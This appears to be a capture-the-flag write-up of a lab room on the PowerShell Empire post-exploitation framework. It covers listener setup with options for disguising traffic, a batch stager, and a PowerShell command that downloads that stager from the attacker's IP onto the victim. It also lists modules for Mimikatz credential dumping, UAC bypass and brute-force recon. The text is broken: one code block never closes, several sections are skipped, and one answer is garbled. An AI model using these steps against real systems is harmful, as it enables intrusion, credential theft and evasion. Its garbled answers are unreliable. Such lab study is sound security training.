# [Task 1] Deploy!

**Deploy this machine and discover what exploit this machine is vulnerable to. (Hint hint, this notice the VM name. I recommend completing the room 'Blue' prior to this room for this purpose alone.)**

# [Task 2] Install

PowerShell Empire is a powerful post-exploitation framework which allows us to perform various functions such as privesc, password gathering, situational awareness, and many more!

Link to the official website: https://www.bc-security.org/post/the-empire-3-0-strikes-back

Clone the following GitHub page and run the initial setup script: https://github.com/BC-SECURITY/Empire/

~~~
# cd /opt
# git clone https://github.com/BC-SECURITY/Empire.git
# cd /opt/Empire
# ./setup/install.sh
~~~

When prompted, enter in a server negotiation password. This can be left blank for random generation, however, you should record this somewhere such as a LastPass vault.

Launch Empire with either `./empire` or `/opt/Empire/empire`


# [Task 3] Listeners

If you're going to play ball, first you have to learn how to catch. Similar to 'catching' a reverse shell with Netcat, we first have to set up a listener in order to properly handle any sort of agent we would install on our victim machine. Answer the following questions using the listeners help menu and then spawn a basic listener. 

## #3.1

**Once empire has launched, type help to view the various menus. Which menu to we launch to access listeners?**

Answer: `listeners`

## #3.2

**Launch the listeners menu. In a manner similar to cobalt strike/metasploit, this will launch a contextual submenu. For the sake of this tutorial, we will be using an http listener in order to catch our connections. Type the command 'uselistener http' now. You can double-tap tab to view all options for listeners following typing 'uselistener'**

~~~
# ./empire
(Empire) > listeners
[!] No listeners currently active 
(Empire: listeners) > uselistener http
(Empire: listeners/http) > 
~~~

## #3.3

**What command can we now type to view all of the options related to our selected listener type?**

*Hint: Use the help command to find this new command*

Answer: `Ã¬nfo`

## #3.4

**Once the information regarding the listener pops up, peruse this for some of the more interesting options we can set in order to disguise our actions more. Which option can we use to set specific times when our listener will be active?**

Answer: `WorkingHours`

## #3.5

**Similar to changing/spoofing what browser you are using on the internet, what option can we set to appear as a different user agent (i.e. chrome, firefox, etc)?**

Answer: `DefaultProfile`

## #3.6

**What option can we use to set the port which the listener will bind to?**

Answer: `Port`

## #3.7

**In addition to changing our browser profile, we can change what our server appears as. What option can we set to change this?**

*Hint: Depending on the context of the help menu you have up, this option might not show up (this is a rare case though). To provide further context to this question, the server version can effective change your listener to appear as Microsoft IIS or possibly Apache. It's all about obfuscation in this context.*

Answer: `ServerVersion` (notice that the option is now `Headers` in the new release)

## #3.8

**Launch our newly created listener on port 80 with the command 'execute'. What message is displayed following successfully launching the listener?**

~~~
(Empire: listeners/http) > set Host 10.9.0.54

## #4.4

**Type execute to finish creating our stager. Where is the stager saved?**

~~~
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > execute

[*] Stager output written out to: /tmp/launcher.bat

Answer: `/tmp/launcher.bat`

## #4.5

**Using any shell you have previously gained into our victim system transport the stager batch file to the system and execute it. This can be done in numerous ways depending on the stager used, be prepared to be flexible with your transportation methods similarly to how you might handle an msfvenom package.**

I first tried to download the `launcher.bat` file on the Windows machine via the reverse shell with a powershell command (`powershell -c "Invoke-WebRequest 'http://10.9.0.54:8000/launcher.bat' -OutFile 'C:\windows\temp\launcher.bat'"`) but it failed. I decided to upgrade my reverse shell to a meterpreter (`session -u 1`) to directly upload the file, which worked perfectly.

## #5.3

**What command do we use to interact with an agent?**

Answer: `interact`

## #5.4

**What about if we wanted to list any usernames and passwords we have gathered?**

Answer: `creds`

## #5.5

**And if we wanted to 'deactivate' an agent for a while to avoid detection?**

Answer: `sleep`

## #5.6

**How about if we wanted to delete an agent or disconnect it?**

Answer: `kill`

## #5.7

**Moving into the post exploitation modules, what command can we use to search through these?**

Answer: `searchmodule`

## #5.8

**We'll start with the most important module, find the module which plays a specific AC/DC song.**

*Hint: Song: Thunderstruck*

~~~
(Empire: agents) > searchmodule AC/DC

 powershell/trollsploit/thunderstruck

        Play's a hidden version of AC/DC's Thunderstruck video while maxing
        out a computer's volume.
~~~

Answer: `python/trollsploit/osx/thunderstruck` (to be updated with new version: `powershell/trollsploit/thunderstruck`)

## #5.9

**What if we wanted to perform an lsa dump with a certain popular windows credential gathering tool?**

*Hint: mimikatz*

~~~
(Empire: agents) > searchmodule lsadump

 powershell/credentials/mimikatz/dcsync

        Runs PowerSploit's Invoke-Mimikatz function to extract a given account
        password through Mimikatz's lsadump::dcsync module. This doesn't need
        code execution on a given DC, but needs to be run from a user context
        with DA equivalent privileges.


 powershell/credentials/mimikatz/lsadump*

        Runs PowerSploit's Invoke-Mimikatz function to extract a particular
        user hash from memory. Useful on domain controllers.


 powershell/credentials/mimikatz/dcsync_hashdump

        Runs PowerSploit's Invoke-Mimikatz function to collect all domain
        hashes using Mimikatz'slsadump::dcsync module. This doesn't need code
        execution on a given DC, but needs to be run froma user context with
        DA equivalent privileges.
~~~

Answer: `powershell/credentials/mimikatz/lsadump`

## #5.10

**Sometime we might not have the permissions level that we require to perform further actions, what module set might we have to use to get around UAC?**

~~~
 powershell/privesc/bypassuac

        Runs a BypassUAC attack to escape from a medium integrity process to a
        high integrity process. This attack was originally discovered by Leo
        Davidson. Empire uses components of MSF's bypassuac injection
        implementation as well as an adapted version of PowerSploit's Invoke--
        Shellcode.ps1 script for backend lifting.
~~~

Answer: `bypassuac`

## #5.11

**What module family allows us to gather additional information about the network we are on?**

~~~
(Empire: agents) > searchmodule powershell/recon

 powershell/recon/fetch_brute_local

        This module will logon to a member server using the agents account or
        a provided account, fetch the local accounts and perform a network
        based brute force attack.


 powershell/recon/find_fruit

        Searches a network range for potentially vulnerable web services.


 powershell/recon/get_sql_server_login_default_pw

        Based on the instance name, test if SQL Server is configured with
        default passwords.
